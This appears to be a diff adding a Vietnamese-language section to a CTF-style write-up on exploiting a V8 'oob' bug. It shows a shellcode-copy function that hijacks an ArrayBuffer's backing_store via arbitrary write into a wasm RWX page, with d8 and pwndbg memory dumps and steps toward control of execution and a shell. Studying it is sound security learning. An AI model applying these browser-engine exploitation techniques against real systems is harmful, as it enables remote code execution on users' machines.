@@ -170,3 +170,56 @@ var wasm_mod = new WebAssembly.Module(wasm_code);
 var wasm_instance = new WebAssembly.Instance(wasm_mod);
 var f = wasm_instance.exports.main;
 ```
+- tiếp theo để copy shellcode vào vùng này ta cần leak địa chỉ rw, địa chỉ rw có thể xuất hiện ở 1 số chỗ trong vùng heap nên có thể leak ra
+```cpp
+function shell_copy(addr, shellcode) {
+    let buf = new ArrayBuffer(0x100);
+    let dataview = new DataView(buf);
+    let buf_addr = addrof(buf);
+
+    console.log("\033[31mbuff: 0x\033[0m"+ buf_addr.toString(16))
+    console.log("\033[31mdebug dataview: 0x\033[0m"+ addrof(dataview).toString(16))
+    let backing_store_addr = buf_addr + 0x20n;
+    wrivar(backing_store_addr, addr);
+
+    for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4*i, shellcode[i], true);
+    }
+}
+
+```
+- với wasm ta chỉ có thể copy shellcode vào vùng địa chỉ mà ko phải rwx bằng việc tạo 1 ArrayBuffer, tuy nhiên ta có quyền ghi nên ta có thể overwrite địa chỉ của ta muốn vào cấu trúc của ArrayBuffer để thay đổi địa chỉ mà shellcode sẽ được copy vào,
+```cpp
+d8>     let buf = new ArrayBuffer(0x100);
+undefined
+d8> %DebugPrint(buf) 
+DebugPrint: 0xddb90f0dd59: [JSArrayBuffer]
+ - map: 0x3563a9e021b9 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x39bcdbd8e981 <Object map = 0x3563a9e02209>
+ - elements: 0x2e379cb40c71 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0x561627199f10
+ - byte_length: 256
+ - detachable
+ - properties: 0x2e379cb40c71 <FixedArray[0]> {}
+ - embedder fields = {
+    0, aligned pointer: (nil)
+    0, aligned pointer: (nil)
+ }
+```
+- backing_store chính là địa chỉ mà shellcode sẽ được copy vào mặc định, ta sẽ thay đổi địa chỉ này
+```asm
+pwndbg> tel 0xddb90f0dd59-1
+00:0000│  0xddb90f0dd58 —▸ 0x3563a9e021b9 ◂— 0x800002e379cb401
+01:0008│  0xddb90f0dd60 —▸ 0x2e379cb40c71 ◂— 0x2e379cb408
+02:0010│  0xddb90f0dd68 —▸ 0x2e379cb40c71 ◂— 0x2e379cb408
+03:0018│  0xddb90f0dd70 ◂— 0x100
+04:0020│  0xddb90f0dd78 —▸ 0x561627199f10 ◂— 0
+```
+- chỉ cần dùng địa chỉ obj + 0x20 sẽ ra địa chỉ cần ghi, và sau đó ghi địa chỉ rwx vào rồi copy shellcode vào đó
+- tiếp theo để chạy shellcode thì cần ghi vào rip, để xác định xem cần ghi vào đâu chính xác ta sẽ giả sử ghi vào 1 địa chỉ không hợp lệ, gdb sẽ dừng tại 1 chỗ mà không thể đi tiếp được
+- ta biết đây là nơi mà lúc ghi được thực thi, sau khi ghi là return vì vậy ta sẽ ghi vào đúng chỗ mà ret vào 
+```asm
+●:2 ► 0x558979894443 <v8::internal::Builtin_Impl_ArrayOob(v8::internal::BuiltinArguments, v8::internal::Isolate*)+291>    movsd  qword ptr [r12 + rcx + 0xf], xmm0
+```
+- và cuối cùng là getshell
